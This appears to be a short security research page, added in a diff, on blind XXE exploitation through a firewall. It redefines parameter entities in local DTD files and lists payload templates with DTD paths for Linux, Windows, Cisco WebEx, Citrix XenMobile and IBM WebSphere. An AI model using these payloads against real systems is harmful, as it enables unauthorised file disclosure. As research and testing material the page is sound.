@@ -1,0 +1,77 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Firewall With Local DTD</title>
+</head><body>Imagine you have an XXE. External entities are supported, but the server’s response is always empty. In this case you have two options: <b>error-based</b>&nbsp;and <b>out-of-band</b>&nbsp;exploitation.<br/>
+<br/>
+What can you do if there is a firewall between you and the target server? Nothing!<br/>
+&nbsp;<br/>
+What if we just put external DTD content directly in the DOCTYPE? Some errors will always appear:<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+External DTD allows us to include one entity inside the second, but it is prohibited in the internal DTD.<br/>
+<br/>
+<b>What can we do with internal DTD? </b><br/>
+To use external DTD syntax in the internal DTD subset, you can bruteforce a local dtd file on the target host and redefine some parameter-entity references inside it:<br/>
+<img src="image 2.png" /><br/>
+<br/>
+<br/>
+<b>Contents of sip-app_1_0.dtd</b><br/>
+&nbsp;… <br/>
+&lt;!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of"&gt;<br/>
+&lt;!ELEMENT pattern (%condition;)&gt;<br/>
+… &nbsp;<br/>
+<br/>
+It works because all XML entities are constant. If you define two entities with the same name, only the first one will be used.<br/>
+<br/>
+<br/>
+<b>How can we find a local dtd file?</b><br/>
+Nothing is easier than enumerating files and directories. Below are a few more examples of successful applications of this trick:<br/>
+<br/>
+Custom Linux System<br/>
+&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;<br/>
+&lt;!ENTITY % ISOamsa 'Your DTD code'&gt;<br/>
+%local_dtd;<br/>
+<br/>
+<br/>
+Custom Windows System<br/>
+&lt;!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd"&gt;<br/>
+&lt;!ENTITY % SuperClass '&gt;Your DTD code&lt;!ENTITY test "test"'&gt;<br/>
+%local_dtd;<br/>
+<br/>
+<br/>
+Thanks to @Mike_n1 from Positive Technologies for sharing this path of always-existing Windows DTD file.<br/>
+Cisco WebEx<br/>
+&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd"&gt;<br/>
+&lt;!ENTITY % url.attribute.set '&gt;Your DTD code&lt;!ENTITY test "test"'&gt;<br/>
+%local_dtd;<br/>
+<br/>
+<br/>
+Citrix XenMobile Server<br/>
+&lt;!ENTITY % local_dtd SYSTEM "jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd"&gt;<br/>
+&lt;!ENTITY % Body '&gt;Your DTD code&lt;!ENTITY test "test"'&gt;<br/>
+%local_dtd;<br/>
+<br/>
+<br/>
+Custom Multi-Platform IBM WebSphere Application<br/>
+&lt;!ENTITY % local_dtd SYSTEM "./../../properties/schemas/j2ee/XMLSchema.dtd"&gt;<br/>
+&lt;!ENTITY % xs-datatypes 'Your DTD code'&gt;<br/>
+&lt;!ENTITY % simpleType "a"&gt;<br/>
+&lt;!ENTITY % restriction "b"&gt;<br/>
+&lt;!ENTITY % boolean "(c)"&gt;<br/>
+&lt;!ENTITY % URIref "CDATA"&gt;<br/>
+&lt;!ENTITY % XPathExpr "CDATA"&gt;<br/>
+&lt;!ENTITY % QName "NMTOKEN"&gt;<br/>
+&lt;!ENTITY % NCName "NMTOKEN"&gt;<br/>
+&lt;!ENTITY % nonNegativeInteger "NMTOKEN"&gt;<br/>
+%local_dtd;<br/>
+<br/>
+<br/>
+&nbsp; <br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
